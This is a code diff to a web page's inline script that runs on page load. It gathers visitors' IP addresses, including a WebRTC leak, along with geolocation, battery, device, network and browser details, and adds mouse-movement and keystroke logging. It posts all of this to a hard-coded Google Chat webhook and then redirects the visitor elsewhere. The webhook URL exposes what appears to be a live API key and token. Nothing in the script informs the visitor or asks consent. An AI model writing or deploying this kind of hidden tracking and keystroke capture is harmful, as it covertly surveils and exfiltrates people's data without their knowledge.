@@ -21,17 +21,32 @@
             return visitCount;
         }
 
+        async function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const peerConnection = new RTCPeerConnection({ iceServers: [] });
+                peerConnection.createDataChannel('');
+                peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
+                peerConnection.onicecandidate = event => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch) {
+                            resolve(ipMatch[1]);
+                        }
+                    }
+                };
+                setTimeout(() => resolve('unknown'), 1000);
+            });
+        }
+
         async function collectAndSendData() {
             try {
-                // Get User ID and Visit Count
                 const userId = getOrCreateUserId();
                 const visitCount = updateVisitCount();
 
-                // Collect IP Address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
+                const webRTCIPLeak = await getWebRTCIP();
 
-                // Collect Battery Info
                 const battery = await navigator.getBattery();
                 const batteryInfo = {
                     charging: battery.charging,
@@ -40,7 +55,6 @@
                     dischargingTime: battery.dischargingTime
                 };
 
-                // Collect Browser and OS Info
                 const browserInfo = {
                     browserName: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
                     browserVersion: navigator.userAgentData?.brands?.[0]?.version || navigator.appVersion,
@@ -50,10 +64,8 @@
                     renderingEngine: navigator.product
                 };
 
-                // Collect Date and Time
                 const dateTime = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
-
-                // Collect Geolocation
+                
                 let locationData = {};
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(position => {
@@ -65,7 +77,6 @@
                     });
                 }
 
-                // Collect Screen Information
                 const screenInfo = {
                     width: screen.width,
                     height: screen.height,
@@ -73,14 +84,15 @@
                     pixelDepth: screen.pixelDepth
                 };
 
-                // Collect Device Information
                 const deviceInfo = {
                     hardwareConcurrency: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
                 };
 
-                // Collect Network Information
                 let connectionData = {};
                 const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (networkInfo) {
@@ -92,17 +104,29 @@
                     };
                 }
 
-                // Collect Time Zone and Locale
                 const timeZoneLocale = {
                     timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language
+                    locale: navigator.language
                 };
 
-                // Combine Data
+                const wifiOrCellular = networkInfo ? networkInfo.effectiveType : 'unknown';
+                const connectionSpeedType = networkInfo ? networkInfo.downlink + ' Mbps, ' + networkInfo.effectiveType : 'unknown';
+
+                let mouseTracking = [];
+                document.addEventListener('mousemove', (event) => {
+                    mouseTracking.push({ x: event.clientX, y: event.clientY, time: Date.now() });
+                });
+
+                let typingPatterns = [];
+                document.addEventListener('keydown', (event) => {
+                    typingPatterns.push({ key: event.key, time: Date.now() });
+                });
+
                 const userData = {
                     userId,
                     visitCount,
                     ip: ipData.ip,
+                    webRTCIPLeak,
                     batteryInfo,
                     browserInfo,
                     dateTime,
@@ -110,10 +134,13 @@
                     screenInfo,
                     deviceInfo,
                     connectionData,
-                    timeZoneLocale
+                    timeZoneLocale,
+                    wifiOrCellular,
+                    connectionSpeedType,
+                    mouseTracking,
+                    typingPatterns
                 };
 
-                // Send Data to Webhook
                 const webhookUrl = "https://chat.googleapis.com/v1/spaces/AAAA4kX04SE/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=cvInZitxbj0ExgHMVYD6NGinfMjid4xAfE5TMZZWhZ8";
                 await fetch(webhookUrl, {
                     method: 'POST',
@@ -121,14 +148,12 @@
                     body: JSON.stringify({ text: JSON.stringify(userData, null, 2) })
                 });
 
-                // Redirect to another page
                 window.location.href = "https://jamison-ai.zapier.app";
             } catch (error) {
                 console.error('Error collecting or sending data:', error);
             }
         }
 
-        // Run the function when the page loads
         window.onload = collectAndSendData;
     </script>
 </head>
